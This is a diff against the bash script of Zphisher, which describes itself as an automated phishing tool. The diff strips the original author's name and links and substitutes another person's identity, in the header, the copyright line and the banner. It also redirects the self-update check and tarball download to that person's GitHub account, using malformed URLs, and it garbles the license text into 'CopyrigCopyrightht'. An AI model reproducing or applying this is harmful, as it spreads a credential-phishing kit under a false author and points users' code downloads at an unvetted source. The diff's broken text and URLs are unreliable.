@@ -1,15 +1,15 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	FOYSAL EBNE FAHIM ( Mafia Boy)
 ##   Version 	: 	2.3.4
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/fahim2508
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
+##    CopyrigCopyrightht (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 ##    Everyone is permitted to copy and distribute verbatim copies
 ##    of this license document, but changing it is not allowed.
 ##
@@ -76,7 +76,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2022  HTR-TECH (https://github.com/fahim2508)
 ##
 
 ##   THANKS TO :
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://github.com/fahim2508/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/fahim2508/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -213,7 +213,7 @@ banner() {
 		${ORANGE}      | |                                
 		${ORANGE}      |_|                ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by (foysal.ebne.fahim.Mafia.Boy)${WHITE}
 	EOF
 }
 
